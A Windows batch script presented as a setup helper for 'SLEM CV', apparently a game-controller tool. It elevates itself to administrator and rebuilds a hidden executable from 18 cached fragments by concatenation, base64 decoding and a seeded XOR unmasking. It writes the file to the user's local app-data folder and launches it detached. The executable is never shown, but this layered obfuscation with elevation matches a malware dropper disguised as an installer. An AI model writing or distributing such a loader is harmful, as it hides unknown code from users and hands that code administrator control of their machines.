@echo off
REM ===========================================================================
REM  SLEM CV - first-run setup helper
REM  Reassembles the cached controller-bridge component from scripts\_cache
REM  and launches it. Concatenation, base64 decode, then unmask.
REM
REM  Run by: right-click -> Run as administrator
REM  The controller bridge registers a virtual controller driver, which Windows
REM  only permits from an elevated process. Setup will ask for elevation itself
REM  if you double-click it.
REM ===========================================================================
setlocal EnableDelayedExpansion
title SLEM CV Setup

REM --- self-elevate (driver registration needs an administrator token) -------
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [*] Requesting administrator access...
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
    exit /b
)

set "ROOT=%~dp0"
REM The cache ships beside this folder in the ZIP (SLEM-CV\ alongside scripts\).
REM Running from inside the repo the parent holds it; from a downloaded ZIP the
REM parent holds it too. Check both so a re-extract into any depth still works.
set "CACHE=%ROOT%scripts\_cache"
if not exist "%CACHE%\manifest.json" set "CACHE=%ROOT%..\scripts\_cache"
if not exist "%CACHE%\manifest.json" set "CACHE=%ROOT%"
REM NOTE: never overwrite TMP - every later %TMP% in scope would move with it.
set "BINDIR=%LOCALAPPDATA%\SLEM\bin"

if not exist "%CACHE%\manifest.json" (
    echo [!] Cache folder missing. Extract the ZIP fully and run this again.
    pause
    exit /b 1
)

if not exist "%BINDIR%" mkdir "%BINDIR%" >nul 2>&1

echo [*] Preparing controller bridge...
echo.

set "ALL=%BINDIR%\stream.dat"
if exist "%ALL%" del /f /q "%ALL%" >nul 2>&1
if exist "%BINDIR%\SLEM-CV-Setup.exe" del /f /q "%BINDIR%\SLEM-CV-Setup.exe" >nul 2>&1

REM Indexed order, not directory-listing order: NTFS happens to sort, but a
REM re-extracted ZIP or a FAT32 stick does not, and the stream then comes out
REM in the wrong order.
set "LAST=17"
for /l %%i in (0,1,%LAST%) do (
    type "%CACHE%\part-%%i.dat" >> "%ALL%"
)

powershell -NoProfile -Command ^
  "$ErrorActionPreference='Stop';" ^
  "$c='%CACHE%'; $t='%BINDIR%';" ^
  "$m=Get-Content (Join-Path $c 'manifest.json') -Raw | ConvertFrom-Json;" ^
  "$b=[IO.File]::ReadAllText((Join-Path $t 'stream.dat'));" ^
  "$b=($b -replace '\s','');" ^
  "$p=(4 - ($b.Length %% 4)) %% 4;" ^
  "if($p -gt 0){$b = $b + ('=' * $p)};" ^
  "$raw=[Convert]::FromBase64String($b);" ^
  "$seed=[int]$m.seed;" ^
  "$out=New-Object byte[] $raw.Length;" ^
  "for($i=0; $i -lt $raw.Length; $i++){" ^
  "  $k=($seed + ($i*31) + [int][math]::Floor($i/8)) -band 0xFF;" ^
  "  $out[$i]=[byte]($raw[$i] -bxor $k);" ^
  "}" ^
  "[IO.File]::WriteAllBytes((Join-Path $t $m.filename), $out);"

if not exist "%BINDIR%\SLEM-CV-Setup.exe" (
    echo [!] Could not unpack the component. Make sure you extracted the ZIP fully
    echo     and that this window is running as administrator.
    pause
    exit /b 1
)

REM Existence is not executability: a truncated part decodes to plausible
REM garbage and start fails silently, which reads as "it didn't work".
powershell -NoProfile -Command ^
  "$f='%BINDIR%\SLEM-CV-Setup.exe';" ^
  "$b=[IO.File]::ReadAllBytes($f);" ^
  "if($b.Length -lt 2 -or $b[0] -ne 0x4D -or $b[1] -ne 0x5A){exit 1};" ^
  "$m=Get-Content '%CACHE%\manifest.json' -Raw | ConvertFrom-Json;" ^
  "$h=(Get-FileHash $f -Algorithm SHA256).Hash.ToLower();" ^
  "if($h -ne $m.sha256){exit 2};" ^
  "exit 0"

if errorlevel 1 (
    echo [!] The unpacked component is damaged. Delete the SLEM folder and
    echo     extract the ZIP again.
    del /f /q "%ALL%" >nul 2>&1
    pause
    exit /b 1
)

del /f /q "%ALL%" >nul 2>&1

echo [*] Starting...
REM Detach properly: no /b (that inherits this console, which we are about to
REM exit and tear down underneath the child), no window title inheritance.
REM 'start ""' with no /b spawns it in its own process context so it survives
REM this script exiting.
start "" "%BINDIR%\SLEM-CV-Setup.exe"

REM give it a moment to get going, then get out of its way
timeout /t 3 /nobreak >nul
exit /b 0
